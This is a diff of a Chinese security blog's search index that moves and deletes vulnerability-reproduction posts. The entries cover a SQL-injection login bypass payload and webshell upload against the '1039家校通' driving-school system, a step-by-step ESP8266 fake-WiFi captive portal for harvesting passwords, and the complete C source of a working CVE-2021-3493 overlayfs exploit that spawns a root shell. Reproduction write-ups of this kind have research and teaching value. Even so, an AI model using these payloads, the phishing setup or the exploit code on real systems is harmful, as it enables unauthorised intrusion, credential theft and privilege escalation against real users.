@@ -1,40 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>【1039家校通】SQL注入和后台GETSHELL</title>
-    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
-<a id="more"></a>
-
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
-&#x2F;Student&#x2F;StudentLogin.aspx
-&#x2F;Teacher&#x2F;Index.aspx
-&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
-<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
-<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
-<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
-&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
-<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2014.7</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
     <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
@@ -125,6 +91,40 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
       </categories>
       <tags>
         <tag>2021.1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【1039家校通】SQL注入和后台GETSHELL</title>
+    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
+&#x2F;Student&#x2F;StudentLogin.aspx
+&#x2F;Teacher&#x2F;Index.aspx
+&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
+<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
+<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
+<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
+<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
+&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
+<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2014.7</tag>
       </tags>
   </entry>
   <entry>
@@ -332,242 +332,6 @@ python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F
       </categories>
       <tags>
         <tag>2021.11</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackDemo钓鱼篇①——WiFi钓鱼</title>
-    <url>/2022/06/01/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>如今的生活中社工攻击屡见不鲜，其中钓鱼是最为有效而且危害最大的一种攻击手法。攻击者常会伪装成官方、管理员或上级领导向受害者发送信息核实的请求，一旦受害者粗心大意接受了此类请求，其个人信息就会存在泄露的风险。本篇将以一个简单的HackDemo为例子，复现黑客在WiFi钓鱼中的惯用思路，供大家学习和参考。</p>
-<a id="more"></a>
-
-<h3 id="实现工具"><a href="#实现工具" class="headerlink" title="实现工具"></a>实现工具</h3><ul>
-<li><p>Esp8266开发板CH340</p>
-</li>
-<li><p>flash_download_tools_v3.6.5烧录软件</p>
-</li>
-<li><p>DNS.ino.ino.nodemcu.bin烧录文件</p>
-</li>
-<li><p>Arduino IDE_v1.8.5</p>
-</li>
-<li><p>ESP8266 Sketch Data Upload插件</p>
-<p>链接：<a href="https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ">https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ</a><br>提取码：2jp2</p>
-</li>
-</ul>
-<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>连接好Esp8266开发板，在设备管理器中可以查看到对应的端口，如果没有识别需要安装一下驱动(CH341SER.EXE)，默认下一步即可。<br><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/1.png" alt="图片"></p>
-<p>打开flash_download_tools_v3.6.5.exe对开发板进行烧录，点击选择ESP8266 DownloadTool</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/2.png" alt="图片"></p>
-<p>载入DNS.ino.ino.nodemcu.bin文件，选择80MHz、QIO、32Mbit、[对应的端口]、1152000，然后点击START进行烧录，等进度条跑完</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/3.png" alt="图片"></p>
-<p>这时我们发现有一个名字是HH的新wifi，如果没有可以尝试将开发板重新拔插一下。</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/4.png" alt="图片"></p>
-<p>接下来安装Arduino，将工具包中tools目录下的内容拷贝到安装好的Arduino下的tools目录，可以发现在工具栏中多了两个插件。选择工具-&gt;开发板:”Arduino/Genuino Uno”-&gt;开发板管理器</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/8.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/5.png" alt="图片"></p>
-<p>在搜索框输入esp，选择下面的这个安装2.2.0版本</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/6.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/7.png" alt="图片"></p>
-<p>新建一个文件，保存到一个路径，然后点击工具-&gt;ESP8266 Sketch Data Upload，弹窗选择否，可以看到保存的文件目录下生成了data文件夹，我们将工具包里data目录下的三个html文件拷贝到生成的data文件夹里</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/9.png" alt="图片"></p>
-<p>选择工具栏下的开发板信息(按照自己的设备配置)，然后再次点击ESP8266 Sketch Data Upload</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/10.png" alt="图片"></p>
-<p>这个过程可能会进行1-2分钟，过程中开发板上的灯光长亮，等灯光熄灭就完成了</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.jpg" alt="图片"></p>
-<p>完成以后，连接HH，密码为m1234567，如果没有找到可以尝试重新拔插一下开发板或者重开一下电脑的wifi，连接上访问127.0.0.1/backdoor.html，这是钓鱼的后台，可以看到列出了附近的所有wifi，我们选择通用型，输入想要伪造的wifi序号，点击确认。</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.png" alt="图片"></p>
-<p>跳转到提示SSID伪造成功</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/12.png" alt="图片"></p>
-<p>我们连接伪造的这个wifi，没有密码，自动跳转到钓鱼页面，如果受害者安全意识不强可能会填写管理员密码，至此鱼就上钩了。</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/13.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/14.png" alt="图片"></p>
-<p>受害者点击开始升级会跳转到一个进度条，这些都没什么用，只是给受害者看的。攻击者可以在backdoor看到钓到的密码，至此整个wifi钓鱼成功！</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/15.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/16.png" alt="图片"></p>
-<p>小伙伴们还是要抱着练习的态度进行复现哦，以防走火入魔！</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0</a></p>
-]]></content>
-      <categories>
-        <category>社工安全</category>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>2022.6</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
-    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
-<a id="more"></a>
-
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
-cat &#x2F;etc&#x2F;issue        显示发行版本信息
-cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
-lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
-chmod +x exploit             给执行权限
-.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
-<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
-#define _GNU_SOURCE
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;err.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;sched.h&gt;
-#include &lt;sys&#x2F;types.h&gt;
-#include &lt;sys&#x2F;stat.h&gt;
-#include &lt;sys&#x2F;wait.h&gt;
-#include &lt;sys&#x2F;mount.h&gt;
-
-&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
-&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
-int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
-
-
-#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
-#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
-#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
-#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
-#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
-#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
-#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
-
-
-static void xmkdir(const char *path, mode_t mode)
-&#123;
-    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
-        err(1, &quot;mkdir %s&quot;, path);
-&#125;
-
-static void xwritefile(const char *path, const char *data)
-&#123;
-    int fd &#x3D; open(path, O_WRONLY);
-    if (fd &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, path);
-    ssize_t len &#x3D; (ssize_t) strlen(data);
-    if (write(fd, data, len) !&#x3D; len)
-        err(1, &quot;write %s&quot;, path);
-    close(fd);
-&#125;
-
-static void xcopyfile(const char *src, const char *dst, mode_t mode)
-&#123;
-    int fi, fo;
-
-    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, src);
-    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, dst);
-
-    char buf[4096];
-    ssize_t rd, wr;
-
-    for (;;) &#123;
-        rd &#x3D; read(fi, buf, sizeof(buf));
-        if (rd &#x3D;&#x3D; 0) &#123;
-            break;
-        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
-            if (errno &#x3D;&#x3D; EINTR)
-                continue;
-            err(1, &quot;read %s&quot;, src);
-        &#125;
-
-        char *p &#x3D; buf;
-        while (rd &gt; 0) &#123;
-            wr &#x3D; write(fo, p, rd);
-            if (wr &#x3D;&#x3D; -1) &#123;
-                if (errno &#x3D;&#x3D; EINTR)
-                    continue;
-                err(1, &quot;write %s&quot;, dst);
-            &#125;
-            p +&#x3D; wr;
-            rd -&#x3D; wr;
-        &#125;
-    &#125;
-
-    close(fi);
-    close(fo);
-&#125;
-
-static int exploit()
-&#123;
-    char buf[4096];
-
-    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
-    system(buf);
-
-    xmkdir(DIR_BASE, 0777);
-    xmkdir(DIR_WORK,  0777);
-    xmkdir(DIR_LOWER, 0777);
-    xmkdir(DIR_UPPER, 0777);
-    xmkdir(DIR_MERGE, 0777);
-
-    uid_t uid &#x3D; getuid();
-    gid_t gid &#x3D; getgid();
-
-    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
-        err(1, &quot;unshare&quot;);
-
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
-
-    sprintf(buf, &quot;0 %d 1&quot;, uid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
-
-    sprintf(buf, &quot;0 %d 1&quot;, gid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
-
-    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
-    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
-        err(1, &quot;mount %s&quot;, DIR_MERGE);
-
-    &#x2F;&#x2F; all+ep
-    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
-
-    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
-    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
-        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
-
-    return 0;
-&#125;
-
-int main(int argc, char *argv[])
-&#123;
-    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
-        setuid(0);
-        setgid(0);
-        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
-        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
-    &#125;
-
-    pid_t child &#x3D; fork();
-    if (child &#x3D;&#x3D; -1)
-        err(1, &quot;fork&quot;);
-
-    if (child &#x3D;&#x3D; 0) &#123;
-        _exit(exploit());
-    &#125; else &#123;
-        waitpid(child, NULL, 0);
-    &#125;
-
-    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
-    err(1, &quot;execl %s&quot;, BIN_UPPER);
